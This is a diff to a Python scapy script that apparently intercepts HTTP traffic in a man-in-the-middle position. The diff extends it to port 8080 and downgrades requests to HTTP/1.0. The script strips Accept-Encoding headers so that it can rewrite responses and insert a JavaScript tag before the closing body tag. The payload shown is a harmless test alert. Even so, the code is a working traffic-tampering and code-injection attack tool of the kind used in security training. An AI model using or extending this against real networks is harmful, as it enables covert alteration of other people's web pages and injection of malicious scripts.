@@ -16,10 +16,11 @@ def processPacket(packet):
     if scapyPacket.haslayer(scapy.Raw):
         try:
             load = scapyPacket[scapy.Raw].load.decode()
-            if scapyPacket[scapy.TCP].dport == 80:
+            if scapyPacket[scapy.TCP].dport == 80 or scapyPacket[scapy.TCP].dport == 8080:
                 print("[+] Request")
                 load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
-            elif scapyPacket[scapy.TCP].sport == 80:
+                load = load.replace("HTTP/1.1", "HTTP/1.0")
+            elif scapyPacket[scapy.TCP].sport == 80 or scapyPacket[scapy.TCP].sport == 8080:
                 print("[+] Response")
                 injectionCode = "<script>alert('test');</script>"
                 load = load.replace("</body>", injectionCode + "</body>")
